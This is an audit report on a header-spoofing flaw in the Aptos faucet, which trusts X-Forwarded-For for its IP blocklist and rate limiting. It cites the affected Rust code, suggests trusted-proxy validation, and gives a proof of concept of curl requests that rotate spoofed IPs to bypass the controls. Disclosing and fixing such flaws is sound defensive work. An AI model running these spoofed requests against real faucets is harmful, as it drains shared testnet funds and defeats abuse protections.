# Audit Report

## Title
IP Spoofing Bypass in Faucet Security Controls via Untrusted Header Trust

## Summary
The `IpBlocklistChecker` and other IP-based security mechanisms in the Aptos faucet implicitly trust the `source_ip` extracted from HTTP headers (`X-Forwarded-For`, `X-Real-IP`) without validating that spoofing defenses were applied upstream by a trusted reverse proxy. This allows attackers to trivially bypass IP blocklists and rate limiters by spoofing these headers.

## Finding Description
The faucet's IP-based security controls rely on `CheckerData.source_ip` which is populated from the `poem::web::RealIp` extractor. [1](#0-0) 

The `RealIp` extractor automatically processes `X-Forwarded-For` and `X-Real-IP` headers from the request, as documented in the code comments. [2](#0-1) 

This extracted IP is then used to construct `CheckerData` without any validation. [3](#0-2) 

The `IpBlocklistChecker` then trusts this IP completely when checking against the blocklist. [4](#0-3) 

**Attack Path:**
1. Attacker sends: `curl -H "X-Forwarded-For: 8.8.8.8" -H "Content-Type: application/json" -d '{"address":"0x123..."}' https://faucet.example.com/fund`
2. The `RealIp` extractor trusts the `X-Forwarded-For: 8.8.8.8` header
3. `IpBlocklistChecker` checks if `8.8.8.8` is blocked, not the attacker's real IP
4. Rate limiters (`MemoryRatelimitChecker`, `RedisRatelimitChecker`) also use the spoofed IP
5. Attacker rotates through different spoofed IPs to bypass all IP-based controls

The codebase has **no configuration** for trusted proxy IP ranges and **no validation** that these headers come from a trusted source. The server configuration shows no proxy trust validation. [5](#0-4) 

## Impact Explanation
This vulnerability allows complete bypass of IP-based security controls, qualifying as **High Severity** under Aptos bug bounty criteria:

1. **Rate Limit Bypass**: Attackers can drain faucet funds by making unlimited requests with different spoofed IPs, bypassing per-IP rate limits
2. **Blocklist Bypass**: Malicious actors can evade IP bans by simply changing the spoofed header value
3. **Service Availability**: Can cause denial of service by exhausting faucet funds, affecting legitimate testnet users
4. **API Abuse**: Qualifies as "API crashes" and "Significant protocol violations" (High Severity criteria)

While the faucet doesn't affect blockchain consensus, it's critical infrastructure for testnets and developer onboarding.

## Likelihood Explanation
**Likelihood: VERY HIGH**

- **Attacker Requirements**: None - any HTTP client can set arbitrary headers
- **Complexity**: Trivial - single header manipulation
- **Detection Difficulty**: Low - attackers can appear as different IPs in logs
- **Exploitation Cost**: Free - no resources required
- **Current Deployments**: If any production faucet is exposed directly to the internet without a properly configured reverse proxy, it's immediately vulnerable

## Recommendation

Implement trusted proxy validation:

1. **Add Trusted Proxy Configuration**:
```rust
pub struct ServerConfig {
    pub listen_address: String,
    pub listen_port: u16,
    pub api_path_base: String,
    pub trusted_proxy_ranges: Vec<IpNetwork>, // NEW
}
```

2. **Validate Proxy Headers**:
```rust
fn get_source_ip(request: &Request, trusted_proxies: &[IpNetwork]) -> Option<IpAddr> {
    let peer_ip = request.remote_addr()?.ip();
    
    // Only trust X-Forwarded-For if request comes from trusted proxy
    if is_trusted_proxy(peer_ip, trusted_proxies) {
        if let Some(forwarded) = parse_x_forwarded_for(request) {
            return Some(forwarded);
        }
    }
    
    // Otherwise use the actual peer IP
    Some(peer_ip)
}
```

3. **Document Deployment Requirements**: Add clear documentation that the faucet MUST be deployed behind a trusted reverse proxy (nginx, HAProxy, AWS ALB) that overwrites client-controlled headers.

4. **Add Startup Validation**: Fail at startup with clear error if `trusted_proxy_ranges` is empty in production mode.

## Proof of Concept

**Test Setup:**
1. Start faucet with IP blocklist containing `10.0.0.1`
2. Attacker's real IP is `192.168.1.100` (not blocked)

**Exploitation:**
```bash
# Request 1: Normal request from real IP works
curl -X POST http://faucet:8081/fund \
  -H "Content-Type: application/json" \
  -d '{"address":"0xabc..."}'
# SUCCESS - First request allowed

# Request 2: Spoof blocked IP, but still works
curl -X POST http://faucet:8081/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 10.0.0.1" \
  -d '{"address":"0xdef..."}'
# SHOULD FAIL (IP blocked) but SUCCEEDS because checker sees 10.0.0.1

# Request 3: Bypass rate limit by changing spoofed IP
curl -X POST http://faucet:8081/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 1.1.1.1" \
  -d '{"address":"0x123..."}'

curl -X POST http://faucet:8081/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 2.2.2.2" \
  -d '{"address":"0x456..."}'

curl -X POST http://faucet:8081/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 3.3.3.3" \
  -d '{"address":"0x789..."}'
# ALL SUCCEED - Rate limiter sees different IPs each time
```

**Expected Behavior**: Only request 1 should succeed. Requests 2-3 should be blocked.

**Actual Behavior**: All requests succeed, demonstrating complete bypass of IP-based security controls.

## Notes

This vulnerability is particularly critical because:
- The faucet is designed to prevent abuse through IP-based controls, but these controls are completely ineffective when deployed without proper proxy configuration
- There's no documentation warning operators about this requirement
- The code provides no mechanism to configure or validate trusted proxies
- Default deployment without infrastructure-level protections leaves the faucet completely unprotected

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L106-108)
```rust
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/checkers/ip_blocklist.rs (L27-51)
```rust
    async fn check(
        &self,
        data: CheckerData,
        _dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        match &data.source_ip {
            IpAddr::V4(source_ip) => {
                if self.manager.ipv4_list.contains(source_ip) {
                    return Ok(vec![RejectionReason::new(
                        format!("IP {} is in blocklist", source_ip),
                        RejectionReasonCode::IpInBlocklist,
                    )]);
                }
            },
            IpAddr::V6(source_ip) => {
                if self.manager.ipv6_list.contains(source_ip) {
                    return Ok(vec![RejectionReason::new(
                        format!("IP {} is in blocklist", source_ip),
                        RejectionReasonCode::IpInBlocklist,
                    )]);
                }
            },
        }
        Ok(vec![])
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L195-220)
```rust
        let listener = TcpListener::bind((
            self.server_config.listen_address.clone(),
            self.server_config.listen_port,
        ))
        .await?;
        let port = listener.local_addr()?.port();

        if let Some(tx) = port_tx {
            tx.send(port).map_err(|_| anyhow!("failed to send port"))?;
        }

        // Create a future for the API server.
        let api_server_future = Server::new_with_acceptor(TcpAcceptor::from_tokio(listener)?).run(
            Route::new()
                .nest(
                    &self.server_config.api_path_base,
                    Route::new()
                        .nest("", api_service)
                        .catch_all_error(convert_error),
                )
                .at("/spec.json", spec_json)
                .at("/spec.yaml", spec_yaml)
                .at("/mint", poem::post(mint.data(fund_api_components)))
                .with(cors)
                .around(middleware_log),
        );
```
